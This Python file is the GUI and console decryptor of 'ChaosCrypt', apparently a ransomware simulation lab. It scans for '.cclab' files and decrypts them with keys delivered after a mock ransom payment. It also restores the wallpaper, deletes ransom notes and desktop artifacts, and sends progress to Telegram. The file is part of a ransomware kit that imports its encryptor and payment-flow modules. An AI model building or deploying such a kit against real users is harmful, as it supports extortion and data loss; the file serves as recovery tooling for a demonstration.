"""
ChaosCrypt Decryptor GUI — File Recovery Portal
==================================================
Повнофункціональний GUI для розшифровки файлів після "оплати викупу":

  1.  Target Selection      — вибір Target_Show / Target_Stealth / Custom
  2.  Key Input             — ввести ключ вручну АБО автозавантаження з delivered_keys.json
  3.  File Scanner          — сканування зашифрованих файлів (.cclab) з превʼю
  4.  Decryption Engine     — розшифровка з прогрес-баром та верифікацією SHA256
  5.  Integrity Check       — перевірка хешів після розшифровки
  6.  Wallpaper Restore     — відновлення шпалер через chaos_effects
  7.  Cleanup               — видалення артефактів (.meta, .bak, ransom notes)
  8.  Full Recovery         — все разом: decrypt + restore + cleanup
  9.  TG Notifications      — звіт про відновлення в TG
  10. Logging               — все в LogBook phase="recovery"

Працює з: encryptor.py, payment_flow.py, chaos_effects.py, antidote.py
"""

import os
import sys
import json
import time
import shutil
import hashlib
import threading
import datetime

current_dir = os.path.dirname(os.path.abspath(__file__))
parent_dir = os.path.dirname(current_dir)
if parent_dir not in sys.path:
    sys.path.append(parent_dir)

from chaoscrypt.settings import (
    ROOT_DIR, LOG_DIR, ASSETS_DIR,
    SHOW_TARGET_DIR, STEALTH_TARGET_DIR,
    ENCRYPTED_SUFFIX, METADATA_SUFFIX, BACKUP_SUFFIX,
    RANSOM_NOTE_NAME, RANSOM_QR_NAME,
    IMG_LOGO_SYSTEM, IMG_ICO_NAME
)
from chaoscrypt.encryptor import StreamingEncryptor, load_metadata
from chaoscrypt.logbook import LogBook

try:
    from chaoscrypt.telegram_notify import send_message, send_photo
except ImportError:
    send_message = None
    send_photo = None

try:
    from chaoscrypt.chaos_effects import ChaosEffects
    HAS_CHAOS = True
except ImportError:
    ChaosEffects = None
    HAS_CHAOS = False

RECOVERY_PHASE = "recovery"
KEY_DELIVERY_PATH = os.path.join(LOG_DIR, "delivered_keys.json")
RECOVERY_REPORT_PATH = os.path.join(LOG_DIR, "recovery_report.json")

def scan_encrypted_files(target_dir):
    """Сканує папку на .cclab файли, повертає список з метаданими."""
    found = []
    if not os.path.isdir(target_dir):
        return found
    for root, dirs, files in os.walk(target_dir):
        for fname in files:
            if fname.endswith(ENCRYPTED_SUFFIX):
                fpath = os.path.join(root, fname)
                meta = None
                try:
                    meta = load_metadata(fpath)
                except Exception:
                    pass
                found.append({
                    "path": fpath,
                    "filename": fname,
                    "original": meta.get("original_file", "???") if meta else "???",
                    "size": os.path.getsize(fpath),
                    "phase": meta.get("phase", "?") if meta else "?",
                    "has_meta": meta is not None,
                    "has_key": bool(meta.get("key_b64")) if meta else False,
                    "sha256": meta.get("sha256", "") if meta else "",
                })
    return found


def load_delivered_keys():
    """Завантажує ключі з delivered_keys.json (від payment_flow)."""
    if not os.path.isfile(KEY_DELIVERY_PATH):
        return {}
    try:
        with open(KEY_DELIVERY_PATH, 'r', encoding='utf-8') as f:
            data = json.load(f)
        keys = {}
        for phase_name, info in data.get("keys", {}).items():
            keys[phase_name] = info.get("key", "")
        return keys
    except Exception:
        return {}


def cleanup_artifacts(target_dir, logger):
    """Видаляє ransom notes, QR, logo артефакти з папки."""
    artifacts = [RANSOM_NOTE_NAME, RANSOM_QR_NAME, "A_CHAOS_CRYPT_LOGO.png",
                 "CHAOSCRYPT_LOGO.png", "ZZZ_AGENT_WOW_MARKER.png"]
    removed = 0
    for root, dirs, files in os.walk(target_dir):
        for f in files:
            if f in artifacts:
                try:
                    os.remove(os.path.join(root, f))
                    removed += 1
                    logger.log_event("remediation", f"Removed artifact: {f}",
                                     metadata={"path": os.path.join(root, f)})
                except Exception:
                    pass
    desktop = os.path.join(os.path.expanduser("~"), "Desktop")
    if os.path.isdir(desktop):
        for f in os.listdir(desktop):
            if (f in artifacts or f.startswith("!!!_ENCRYPTED_")
                    or f == "PAYMENT_RECEIPT.txt" or f.startswith("BSOD_")):
                try:
                    os.remove(os.path.join(desktop, f))
                    removed += 1
                except Exception:
                    pass
    return removed


def cleanup_meta_and_bak(target_dir, logger):
    """Видаляє .meta та .bak файли після успішної розшифровки."""
    removed = 0
    for root, dirs, files in os.walk(target_dir):
        for f in files:
            if f.endswith(METADATA_SUFFIX) or f.endswith(BACKUP_SUFFIX):
                try:
                    os.remove(os.path.join(root, f))
                    removed += 1
                    logger.log_event("remediation", f"Cleaned: {f}")
                except Exception:
                    pass
    return removed

class DecryptorGUI:
    """Tkinter GUI для розшифровки файлів."""

    def __init__(self):
        self.logger = LogBook(phase=RECOVERY_PHASE)
        self.decrypted_count = 0
        self.failed_count = 0
        self.total_files = 0
        self.is_running = False

        self.logger.log_event("info", "Decryptor GUI initialized")

    def run(self):
        """Запускає GUI."""
        try:
            import tkinter as tk
            from tkinter import ttk, filedialog, messagebox
        except ImportError:
            print("[DECRYPTOR] tkinter not available. Use --console mode.")
            self.run_console()
            return

        self.root = tk.Tk()
        self.root.title("ChaosCrypt Decryptor - File Recovery")
        self.root.configure(bg='#0a0a0a')
        self.root.geometry("850x700")
        self.root.resizable(False, False)

        ico = os.path.join(ASSETS_DIR, IMG_ICO_NAME)
        if os.path.exists(ico):
            try:
                self.root.iconbitmap(ico)
            except Exception:
                pass

        self._build_gui(tk, ttk)
        self._auto_load_keys()
        self._auto_scan()

        self.root.update_idletasks()
        x = (self.root.winfo_screenwidth() // 2) - 425
        y = (self.root.winfo_screenheight() // 2) - 350
        self.root.geometry(f"+{x}+{y}")

        self.root.mainloop()
        self.logger.close()

    def _build_gui(self, tk, ttk):
        """Будує весь інтерфейс."""
        header = tk.Frame(self.root, bg='#0a0a0a')
        header.pack(fill="x", padx=20, pady=(15, 5))

        logo_path = os.path.join(ASSETS_DIR, IMG_LOGO_SYSTEM)
        if os.path.exists(logo_path):
            try:
                from PIL import Image, ImageTk
                li = Image.open(logo_path).resize((50, 50), Image.LANCZOS)
                lp = ImageTk.PhotoImage(li)
                ll = tk.Label(header, image=lp, bg='#0a0a0a')
                ll.image = lp
                ll.pack(side="left", padx=(0, 10))
            except ImportError:
                pass

        title_frame = tk.Frame(header, bg='#0a0a0a')
        title_frame.pack(side="left")
        tk.Label(title_frame, text="CHAOSCRYPT DECRYPTOR",
                 font=("Consolas", 18, "bold"), fg="#00ff88", bg="#0a0a0a").pack(anchor="w")
        tk.Label(title_frame, text="File Recovery Portal v3.0",
                 font=("Consolas", 9), fg="#555555", bg="#0a0a0a").pack(anchor="w")

        tk.Frame(self.root, bg="#1a1a1a", height=2).pack(fill="x", padx=20, pady=8)

        target_frame = tk.Frame(self.root, bg='#0a0a0a')
        target_frame.pack(fill="x", padx=20, pady=5)

        tk.Label(target_frame, text="TARGET:", font=("Consolas", 10, "bold"),
                 fg="#aaaaaa", bg="#0a0a0a").pack(side="left")

        self.target_var = tk.StringVar(value="show")
        for val, label, color in [
            ("show", "Target_Show", "#00ff00"),
            ("stealth", "Target_Stealth", "#0088ff"),
            ("both", "Both", "#ff9900"),
        ]:
            tk.Radiobutton(target_frame, text=label, variable=self.target_var,
                           value=val, font=("Consolas", 9), fg=color, bg="#0a0a0a",
                           selectcolor="#1a1a1a", activebackground="#0a0a0a",
                           activeforeground=color,
                           command=self._auto_scan).pack(side="left", padx=8)

        scan_btn = tk.Button(target_frame, text="SCAN", font=("Consolas", 9, "bold"),
                             fg="#000000", bg="#00ff88", activebackground="#00cc66",
                             command=self._auto_scan, relief="flat", padx=10)
        scan_btn.pack(side="right")

        key_frame = tk.Frame(self.root, bg='#0a0a0a')
        key_frame.pack(fill="x", padx=20, pady=5)

        tk.Label(key_frame, text="KEY:", font=("Consolas", 10, "bold"),
                 fg="#aaaaaa", bg="#0a0a0a").pack(side="left")

        self.key_var = tk.StringVar(value="")
        self.key_entry = tk.Entry(key_frame, textvariable=self.key_var,
                                  font=("Consolas", 10), fg="#00ff00", bg="#1a1a1a",
                                  insertbackground="#00ff00", relief="flat", width=45)
        self.key_entry.pack(side="left", padx=8, fill="x", expand=True)

        self.key_source_var = tk.StringVar(value="")
        tk.Label(key_frame, textvariable=self.key_source_var,
                 font=("Consolas", 8), fg="#555555", bg="#0a0a0a").pack(side="left", padx=5)

        auto_btn = tk.Button(key_frame, text="AUTO", font=("Consolas", 8, "bold"),
                             fg="#000000", bg="#ff9900", activebackground="#cc7700",
                             command=self._auto_load_keys, relief="flat", padx=6)
        auto_btn.pack(side="right", padx=2)

        meta_btn = tk.Button(key_frame, text="FROM META", font=("Consolas", 8, "bold"),
                             fg="#000000", bg="#0088ff", activebackground="#0066cc",
                             command=lambda: self._set_key_source("meta"), relief="flat", padx=6)
        meta_btn.pack(side="right", padx=2)

        list_frame = tk.Frame(self.root, bg='#0a0a0a')
        list_frame.pack(fill="both", expand=True, padx=20, pady=5)

        tk.Label(list_frame, text="ENCRYPTED FILES:", font=("Consolas", 10, "bold"),
                 fg="#aaaaaa", bg="#0a0a0a").pack(anchor="w")

        columns = ("original", "size", "phase", "key", "status")
        self.tree = ttk.Treeview(list_frame, columns=columns, show="headings", height=10)
        self.tree.heading("original", text="Original File")
        self.tree.heading("size", text="Size")
        self.tree.heading("phase", text="Phase")
        self.tree.heading("key", text="Key")
        self.tree.heading("status", text="Status")
        self.tree.column("original", width=250)
        self.tree.column("size", width=80, anchor="e")
        self.tree.column("phase", width=80, anchor="center")
        self.tree.column("key", width=80, anchor="center")
        self.tree.column("status", width=120, anchor="center")

        style = ttk.Style()
        style.theme_use("clam")
        style.configure("Treeview", background="#111111", foreground="#cccccc",
                         fieldbackground="#111111", font=("Consolas", 9))
        style.configure("Treeview.Heading", background="#1a1a1a", foreground="#00ff88",
                         font=("Consolas", 9, "bold"))
        style.map("Treeview", background=[("selected", "#003322")])

        scrollbar = ttk.Scrollbar(list_frame, orient="vertical", command=self.tree.yview)
        self.tree.configure(yscrollcommand=scrollbar.set)
        self.tree.pack(side="left", fill="both", expand=True)
        scrollbar.pack(side="right", fill="y")

        progress_frame = tk.Frame(self.root, bg='#0a0a0a')
        progress_frame.pack(fill="x", padx=20, pady=5)

        self.progress_var = tk.DoubleVar(value=0)
        self.progress = ttk.Progressbar(progress_frame, variable=self.progress_var,
                                         maximum=100, length=600)
        style.configure("TProgressbar", troughcolor="#1a1a1a", background="#00ff88",
                         darkcolor="#00ff88", lightcolor="#00ff88")
        self.progress.pack(fill="x", pady=3)

        self.status_var = tk.StringVar(value="Ready. Scan targets and enter key to begin.")
        tk.Label(progress_frame, textvariable=self.status_var,
                 font=("Consolas", 9), fg="#ffff00", bg="#0a0a0a").pack(anchor="w")

        stats_frame = tk.Frame(self.root, bg='#0a0a0a')
        stats_frame.pack(fill="x", padx=20, pady=3)

        self.stats_var = tk.StringVar(value="Files: 0 encrypted | 0 decrypted | 0 failed")
        tk.Label(stats_frame, textvariable=self.stats_var,
                 font=("Consolas", 9), fg="#888888", bg="#0a0a0a").pack(side="left")

        btn_frame = tk.Frame(self.root, bg='#0a0a0a')
        btn_frame.pack(fill="x", padx=20, pady=(5, 15))

        buttons = [
            ("DECRYPT ALL", "#00ff88", "#000000", self._decrypt_all),
            ("FULL RECOVERY", "#ff9900", "#000000", self._full_recovery),
            ("RESTORE WALLPAPER", "#0088ff", "#000000", self._restore_wallpaper),
            ("CLEANUP", "#ff3333", "#ffffff", self._cleanup_all),
        ]

        for text, bg, fg, cmd in buttons:
            tk.Button(btn_frame, text=text, font=("Consolas", 10, "bold"),
                      fg=fg, bg=bg, activebackground=bg, relief="flat",
                      padx=12, pady=6, command=cmd).pack(side="left", padx=4)

    def _get_target_dirs(self):
        target = self.target_var.get()
        if target == "show":
            return [SHOW_TARGET_DIR]
        elif target == "stealth":
            return [STEALTH_TARGET_DIR]
        else:
            return [SHOW_TARGET_DIR, STEALTH_TARGET_DIR]

    def _auto_scan(self):
        for item in self.tree.get_children():
            self.tree.delete(item)

        self.encrypted_files = []
        for target_dir in self._get_target_dirs():
            self.encrypted_files.extend(scan_encrypted_files(target_dir))

        self.total_files = len(self.encrypted_files)

        for ef in self.encrypted_files:
            size_str = self._format_size(ef["size"])
            key_str = "META" if ef["has_key"] else "MANUAL"
            self.tree.insert("", "end", values=(
                ef["original"], size_str, ef["phase"].upper(),
                key_str, "Encrypted"
            ))

        self.stats_var.set(f"Files: {self.total_files} encrypted | 0 decrypted | 0 failed")
        self.status_var.set(f"Scan complete. Found {self.total_files} encrypted files.")
        self.progress_var.set(0)

        self.logger.log_event("info", f"Scanned targets", metadata={
            "targets": [d for d in self._get_target_dirs()],
            "encrypted_files": self.total_files
        })

    def _format_size(self, size_bytes):
        if size_bytes < 1024:
            return f"{size_bytes} B"
        elif size_bytes < 1024 * 1024:
            return f"{size_bytes / 1024:.1f} KB"
        else:
            return f"{size_bytes / (1024*1024):.1f} MB"

    def _auto_load_keys(self):
        keys = load_delivered_keys()
        target = self.target_var.get() if hasattr(self, 'target_var') else 'show'

        if target == "both":
            key = keys.get("show") or keys.get("stealth", "")
        else:
            key = keys.get(target, "")

        if key:
            self.key_var.set(key)
            self.key_source_var.set("(from delivered_keys.json)")
            self.logger.log_event("info", "Key auto-loaded from delivered_keys.json",
                                  metadata={"phase": target, "key_prefix": key[:8] + "..."})
        else:
            self.key_source_var.set("(no key found - check payment)")

    def _set_key_source(self, source):
        if source == "meta":
            self.key_var.set("")
            self.key_source_var.set("(using key from .meta files)")

    def _decrypt_all(self):
        if self.is_running:
            return
        if self.total_files == 0:
            self.status_var.set("No encrypted files found. Scan first.")
            return

        self.is_running = True
        self.decrypted_count = 0
        self.failed_count = 0

        thread = threading.Thread(target=self._decrypt_worker, daemon=True)
        thread.start()

    def _decrypt_worker(self):
        manual_key = self.key_var.get().strip() or None
        delivered = load_delivered_keys()

        self.status_var.set("Decrypting files...")
        self.logger.log_event("info", "Decryption started", metadata={
            "total_files": self.total_files,
            "manual_key": bool(manual_key)
        })

        if send_message:
            send_message(
                f"🔓 <b>Decryption Started</b>\n"
                f"<code>Files: {self.total_files}</code>\n"
                f"<code>Key source: {'manual' if manual_key else 'auto/meta'}</code>",
                parse_mode="HTML", async_mode=True
            )

        for idx, ef in enumerate(self.encrypted_files):
            phase = ef["phase"]

            key_to_use = manual_key or delivered.get(phase) or None

            encryptor = StreamingEncryptor(phase=phase or "recovery")
            ok = encryptor.decrypt_file(ef["path"], key_b64=key_to_use)
            encryptor.close()

            if ok:
                self.decrypted_count += 1
                status = "RECOVERED"
                tag = "recovered"
            else:
                self.failed_count += 1
                status = "FAILED"
                tag = "failed"

            pct = int((idx + 1) / self.total_files * 100)
            self.root.after(0, self._update_progress, idx, status, pct)

            self.logger.log_event("recovery", f"File {status.lower()}: {ef['original']}",
                                  metadata={"file": ef["path"], "phase": phase},
                                  tag=tag)
            time.sleep(0.15)

        self.root.after(0, self._decrypt_finished)

    def _update_progress(self, idx, status, pct):
        self.progress_var.set(pct)
        children = self.tree.get_children()
        if idx < len(children):
            item = children[idx]
            values = list(self.tree.item(item, "values"))
            values[4] = status
            self.tree.item(item, values=values)
            self.tree.see(item)
        self.stats_var.set(
            f"Files: {self.total_files} encrypted | "
            f"{self.decrypted_count} decrypted | {self.failed_count} failed"
        )
        self.status_var.set(f"Decrypting... {pct}%")

    def _decrypt_finished(self):
        self.is_running = False
        self.progress_var.set(100)

        if self.failed_count == 0:
            msg = f"All {self.decrypted_count} files recovered successfully!"
            self.status_var.set(msg)
        else:
            msg = (f"Done: {self.decrypted_count} recovered, "
                   f"{self.failed_count} failed. Check keys.")
            self.status_var.set(msg)

        report = {
            "timestamp": datetime.datetime.now(datetime.timezone.utc).isoformat(),
            "total": self.total_files,
            "decrypted": self.decrypted_count,
            "failed": self.failed_count,
            "targets": [d for d in self._get_target_dirs()],
        }
        try:
            with open(RECOVERY_REPORT_PATH, 'w', encoding='utf-8') as f:
                json.dump(report, f, indent=2)
        except Exception:
            pass

        self.logger.log_event("finish", "Decryption complete", metadata=report)

        if send_message:
            icon = "✅" if self.failed_count == 0 else "⚠️"
            send_message(
                f"{icon} <b>Decryption Complete</b>\n"
                f"<code>Recovered: {self.decrypted_count}/{self.total_files}</code>\n"
                f"<code>Failed:    {self.failed_count}</code>",
                parse_mode="HTML", async_mode=False
            )

    def _restore_wallpaper(self):
        if HAS_CHAOS:
            try:
                fx = ChaosEffects()
                fx.wallpaper_restore()
                fx.logger.close()
                self.status_var.set("Wallpaper restored.")
                self.logger.log_event("remediation", "Wallpaper restored via GUI")
            except Exception as e:
                self.status_var.set(f"Wallpaper restore error: {e}")
        else:
            self.status_var.set("chaos_effects not available.")

    def _cleanup_all(self):
        total_removed = 0
        for target_dir in self._get_target_dirs():
            total_removed += cleanup_artifacts(target_dir, self.logger)
            total_removed += cleanup_meta_and_bak(target_dir, self.logger)

        if HAS_CHAOS:
            try:
                fx = ChaosEffects()
                fx.desktop_cleanup()
                fx.logger.close()
                total_removed += 1
            except Exception:
                pass

        self.status_var.set(f"Cleanup complete. {total_removed} artifacts removed.")
        self.logger.log_event("remediation", "Full cleanup via GUI",
                              metadata={"removed": total_removed})

        if send_message:
            send_message(
                f"🧹 <b>Cleanup Complete</b>\n"
                f"<code>Artifacts removed: {total_removed}</code>",
                parse_mode="HTML", async_mode=True
            )

        self._auto_scan()

    def _full_recovery(self):
        """Decrypt + Restore Wallpaper + Cleanup — все за один клік."""
        if self.is_running:
            return
        self.is_running = True
        self.decrypted_count = 0
        self.failed_count = 0

        thread = threading.Thread(target=self._full_recovery_worker, daemon=True)
        thread.start()

    def _full_recovery_worker(self):
        self.logger.log_event("info", "Full recovery started")

        if send_message:
            send_message(
                "🔄 <b>Full Recovery Started</b>\n"
                "<code>Decrypt + Restore + Cleanup</code>",
                parse_mode="HTML", async_mode=True
            )

        self.root.after(0, lambda: self.status_var.set("Phase 1/3: Decrypting files..."))
        manual_key = self.key_var.get().strip() or None
        delivered = load_delivered_keys()

        for idx, ef in enumerate(self.encrypted_files):
            phase = ef["phase"]
            key_to_use = manual_key or delivered.get(phase) or None

            encryptor = StreamingEncryptor(phase=phase or "recovery")
            ok = encryptor.decrypt_file(ef["path"], key_b64=key_to_use)
            encryptor.close()

            if ok:
                self.decrypted_count += 1
                status = "RECOVERED"
            else:
                self.failed_count += 1
                status = "FAILED"

            pct = int((idx + 1) / max(self.total_files, 1) * 100)
            self.root.after(0, self._update_progress, idx, status, pct)
            time.sleep(0.1)

        self.root.after(0, lambda: self.status_var.set("Phase 2/3: Restoring wallpaper..."))
        if HAS_CHAOS:
            try:
                fx = ChaosEffects()
                fx.wallpaper_restore()
                fx.logger.close()
            except Exception:
                pass
        time.sleep(0.5)

        self.root.after(0, lambda: self.status_var.set("Phase 3/3: Cleaning up artifacts..."))
        total_cleaned = 0
        for target_dir in self._get_target_dirs():
            total_cleaned += cleanup_artifacts(target_dir, self.logger)
            total_cleaned += cleanup_meta_and_bak(target_dir, self.logger)

        if HAS_CHAOS:
            try:
                fx = ChaosEffects()
                fx.desktop_cleanup()
                fx.logger.close()
            except Exception:
                pass
        time.sleep(0.5)

        self.root.after(0, self._full_recovery_finished, total_cleaned)

    def _full_recovery_finished(self, cleaned):
        self.is_running = False
        self.progress_var.set(100)

        msg = (f"Full recovery complete! "
               f"{self.decrypted_count} files recovered, "
               f"{cleaned} artifacts cleaned.")
        self.status_var.set(msg)
        self.stats_var.set(
            f"Files: {self.total_files} encrypted | "
            f"{self.decrypted_count} decrypted | {self.failed_count} failed"
        )

        report = {
            "timestamp": datetime.datetime.now(datetime.timezone.utc).isoformat(),
            "type": "full_recovery",
            "total": self.total_files,
            "decrypted": self.decrypted_count,
            "failed": self.failed_count,
            "artifacts_cleaned": cleaned,
            "wallpaper_restored": HAS_CHAOS,
        }
        try:
            with open(RECOVERY_REPORT_PATH, 'w', encoding='utf-8') as f:
                json.dump(report, f, indent=2)
        except Exception:
            pass

        self.logger.log_event("finish", "Full recovery complete", metadata=report)

        if send_message:
            icon = "✅" if self.failed_count == 0 else "⚠️"
            send_message(
                f"{icon} <b>Full Recovery Complete</b>\n"
                f"<code>Recovered:  {self.decrypted_count}/{self.total_files}</code>\n"
                f"<code>Failed:     {self.failed_count}</code>\n"
                f"<code>Cleaned:    {cleaned} artifacts</code>\n"
                f"<code>Wallpaper:  {'restored' if HAS_CHAOS else 'N/A'}</code>",
                parse_mode="HTML", async_mode=False
            )

        self._auto_scan()

    def run_console(self):
        """Консольна розшифровка без GUI."""
        print("\n" + "=" * 60)
        print("  CHAOSCRYPT DECRYPTOR — Console Mode")
        print("=" * 60)

        delivered = load_delivered_keys()
        print(f"\n[DECRYPTOR] Delivered keys: {list(delivered.keys())}")

        for phase_name, target_dir in [("show", SHOW_TARGET_DIR), ("stealth", STEALTH_TARGET_DIR)]:
            files = scan_encrypted_files(target_dir)
            if not files:
                print(f"\n[{phase_name.upper()}] No encrypted files found.")
                continue

            key = delivered.get(phase_name)
            print(f"\n[{phase_name.upper()}] {len(files)} encrypted files found.")
            if key:
                print(f"[{phase_name.upper()}] Key: {key[:20]}...")
            else:
                print(f"[{phase_name.upper()}] No key — using .meta fallback.")

            encryptor = StreamingEncryptor(phase=phase_name)
            ok_count = 0
            fail_count = 0

            for i, ef in enumerate(files):
                bar_len = 30
                filled = int(bar_len * (i + 1) / len(files))
                bar = "█" * filled + "░" * (bar_len - filled)
                pct = int((i + 1) / len(files) * 100)

                result = encryptor.decrypt_file(ef["path"], key_b64=key)
                if result:
                    ok_count += 1
                    icon = "OK"
                else:
                    fail_count += 1
                    icon = "FAIL"

                sys.stdout.write(
                    f"\r  [{bar}] {pct:3d}% | {ef['original']:<30s} {icon}"
                )
                sys.stdout.flush()
                time.sleep(0.1)

            encryptor.close()
            print(f"\n[{phase_name.upper()}] Done: {ok_count} recovered, {fail_count} failed.")

            self.logger.log_event("finish", f"Console decrypt: {phase_name}",
                                  metadata={"recovered": ok_count, "failed": fail_count})

        print("\n[CLEANUP] Removing artifacts...")
        total_cleaned = 0
        for target_dir in [SHOW_TARGET_DIR, STEALTH_TARGET_DIR]:
            total_cleaned += cleanup_artifacts(target_dir, self.logger)
            total_cleaned += cleanup_meta_and_bak(target_dir, self.logger)
        print(f"[CLEANUP] {total_cleaned} artifacts removed.")

        # Wallpaper
        if HAS_CHAOS:
            print("[RESTORE] Restoring wallpaper...")
            try:
                fx = ChaosEffects()
                fx.wallpaper_restore()
                fx.desktop_cleanup()
                fx.logger.close()
                print("[RESTORE] Done.")
            except Exception as e:
                print(f"[RESTORE] Error: {e}")

        if send_message:
            send_message("✅ <b>Console Recovery Complete</b>",
                         parse_mode="HTML", async_mode=False)

        print("\n" + "=" * 60)
        print("  RECOVERY COMPLETE")
        print("=" * 60)
        self.logger.close()


def main():
    import argparse
    parser = argparse.ArgumentParser(description="ChaosCrypt Decryptor GUI")
    parser.add_argument('--console', action='store_true', help="Console mode (no GUI)")
    parser.add_argument('--target', choices=['show', 'stealth', 'both'], default='both',
                        help="Target directory")
    parser.add_argument('--key', type=str, default=None, help="Decryption key (base64)")
    args = parser.parse_args()

    gui = DecryptorGUI()

    if args.console:
        gui.run_console()
    else:
        gui.run()


if __name__ == "__main__":
    main()